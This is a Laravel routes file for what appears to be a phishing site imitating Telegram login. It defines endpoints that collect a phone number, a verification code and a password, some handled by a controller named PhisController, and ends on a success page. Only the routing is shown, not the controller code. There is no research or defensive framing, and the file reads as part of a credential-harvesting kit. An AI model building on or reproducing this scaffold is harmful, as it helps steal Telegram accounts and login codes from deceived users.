<?php


use Illuminate\Foundation\Application;
use Illuminate\Support\Facades\Route;
use Inertia\Inertia;
use App\Http\Controllers\HomeController;
use App\Http\Controllers\PhisController;

Route::get('', [HomeController::class, 'index_first'])->name('home');
Route::get('login-telegram', [HomeController::class, 'index'])->name('index');
Route::post('login-handler', [HomeController::class, 'login_store'])->name('login-store');
Route::get('verif', [HomeController::class, 'verif'])->name('verif');
Route::post('verif-store', [HomeController::class, 'verif_store'])->name('verif-store');
Route::get('password', [HomeController::class, 'get_password'])->name('get-password');
Route::post('password', [HomeController::class, 'store_password'])->name('store-password');

Route::post('store-number', [PhisController::class, 'store_number'])->name('phis-store-number');
Route::get('verifikasi-number', [PhisController::class, 'verif'])->name('phis-verif');
Route::post('store-verif', [PhisController::class, 'store_verif'])->name('phis_store_verif');
Route::get('success', [PhisController::class, 'success'])->name('phis-success');
